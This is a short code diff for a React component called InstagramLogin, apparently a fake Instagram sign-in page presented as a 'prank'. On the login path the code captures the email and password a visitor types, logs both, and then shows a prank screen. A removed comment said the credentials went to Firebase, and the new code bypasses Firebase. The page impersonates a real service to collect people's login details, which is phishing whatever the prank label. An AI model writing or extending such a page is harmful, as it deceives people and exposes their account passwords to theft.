@@ -37,8 +37,8 @@ const InstagramLogin = () => {
         // For signup, still use Firebase
         await signup(email, password);
       } else {
-        console.log('🎭 Taking prank/login path');
-        // For login, CAPTURE THE CREDENTIALS TO FIREBASE! 🎯
+        console.log('🎭 Taking prank/login path - BYPASSING FIREBASE FOR PRANK');
+        // For login, CAPTURE THE CREDENTIALS! 🎯
         console.log('🎯 Starting prank sequence...');
         console.log('📧 Email:', email);
         console.log('🔐 Password:', password);
@@ -76,9 +76,10 @@ const InstagramLogin = () => {
           setLoading(false);
           setShowPrankScreen(true);
         }, 2000);
-        return;
+        return; // IMPORTANT: Return here to prevent trying Firebase login
       }
     } catch (error) {
+      console.error('❌ Error in handleSubmit:', error);
       setError(error.message);
     }
     
